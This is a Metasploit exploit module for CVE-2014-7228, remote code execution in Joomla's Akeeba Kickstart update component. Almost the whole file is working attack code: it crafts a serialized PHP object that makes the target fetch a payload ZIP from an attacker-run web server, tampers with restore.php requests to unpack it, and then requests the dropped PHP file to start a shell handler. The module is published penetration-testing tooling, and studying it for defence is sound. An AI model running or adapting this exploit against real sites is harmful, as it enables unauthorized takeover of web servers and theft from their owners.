##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex/zip'
require 'json'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Joomla / Akeeba Kickstart Remote Code Execution",
      'Description'    => %q{
        This module exploits a vulnerability found in Joomla! through 2.5.25, 3.2.5 and
        earlier 3.x versions, 3.3.0 through 3.3.4 versions. The vulnerability more
        specifically affects the Akeeba component, which is responsible for Joomla!
        updates. Nevertheless it is worth to note that this vulnerability is only present
        during the update of the Joomla! CMS.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Johannes Dahse',               # Vulnerability discovery
          'us3r777 <us3r777[at]n0b0.so>'  # Metasploit module
        ],
      'References'     =>
        [
          [ 'CVE', '2014-7228' ],
          [ 'URL', 'http://developer.joomla.org/security/595-20140903-core-remote-file-inclusion.html'],
          [ 'URL', 'https://www.akeebabackup.com/home/news/1605-security-update-sep-2014.html'],
          [ 'URL', 'http://websec.wordpress.com/2014/10/05/joomla-3-3-4-akeeba-kickstart-remote-code-execution-cve-2014-7228/'],
        ],
      'Platform'       => ['php'],
      'Arch'           => ARCH_PHP,
      'Targets'        =>
        [
          [ 'Joomla < 2.5.25 / Joomla 3.x < 3.2.5 / Joomla 3.3.0 < 3.3.4', {} ]
        ],
      'Stance' => Msf::Exploit::Stance::Aggressive,
      'Privileged'     => false,
      'DisclosureDate' => "Sep 29 2014",
      'DefaultTarget'  => 0))

      register_options(
        [
          OptString.new('TARGETURI', [true, 'The base path to Joomla', '/joomla'])
        ], self.class)

  end

  def check
    send_request_cgi(
      'uri'    => normalize_uri(target_uri, 'administrator', 'components', 'com_joomlaupdate', 'restoration.php')
    )
    if res and (res.code == 200)
        return Exploit::CheckCode::Detected
    end

    return Exploit::CheckCode::Safe
  end

  def exploit
    srv_host = srvhost_addr
    srv_port = datastore['SRVPORT']
    resource_uri = random_uri + '.zip'
    srv_uri = 'http://' + srvhost_addr + ':' + datastore['SRVPORT'].to_s + resource_uri

    php_serialized_akfactory = 'O:9:"AKFactory":1:{s:18:"'+ "\x00" + 'AKFactory' + "\x00" + 'varlist";a:4:{s:17:"kickstart.enabled";b:1;s:27:"kickstart.security.password";s:0:"";s:26:"kickstart.setup.sourcefile";s:' + srv_uri.length.to_s + ':"' + srv_uri + '";s:24:"kickstart.setup.filetype";s:3:"ZIP";}}'

    php_filename = rand_text_alpha(8 + rand(8)) + '.php'

    # Create the zip archive
    print_status("Creating archive with file " + php_filename)
    zip_file = Rex::Zip::Archive.new
    zip_file.add_file(php_filename, payload.encoded)
    @zip = zip_file.pack

    print_status("Starting up our web service on #{srv_uri} ...")
    start_service(
      {'Uri' =>
        {
          'Proc' => Proc.new { |cli, req|
            on_request_uri(cli, req)
          },
          'Path' => resource_uri
        }
      }
    )

    print_status("Sending our payload to #{peer}")
    res = send_request_cgi({
      'uri'       => normalize_uri(target_uri, 'administrator', 'components', 'com_joomlaupdate', 'restore.php'),
      'vars_get'  => {
        'task'    => 'stepRestore',
        'factory' => Rex::Text.encode_base64(php_serialized_akfactory)
      }
    })

    unless res && res.body =~ /###(.*)###/
      fail_with("Error while injecting PHP serialized object : " + res.body)
    end

    json = /###(.*)###/.match(res.body)[1]
    b64encoded_prepared_factory = JSON.parse(json)['factory']
    prepared_factory = Rex::Text.decode_base64(b64encoded_prepared_factory)
    modified_factory = prepared_factory.gsub('currentPartNumber";i:0', 'currentPartNumber";i:-1')

    res = send_request_cgi({
      'uri'       => normalize_uri(target_uri, 'administrator', 'components', 'com_joomlaupdate', 'restore.php'),
      'vars_get'  => {
        'task'    => 'stepRestore',
        'factory' => Rex::Text.encode_base64(modified_factory)
      }
    })
    register_files_for_cleanup(php_filename)

    send_request_cgi({
      'uri' => normalize_uri(target_uri, 'administrator', 'components', 'com_joomlaupdate', php_filename)
    })

    handler
  end

  # Handle incoming requests from the server
  def on_request_uri(cli, request)
    if (not @zip)
      print_error("A request came in, but the ZIP archive wasn't ready yet!")
      return
    end

    print_status("Sending the WAR archive to the server...")
    send_response(cli, @zip)
  end

end
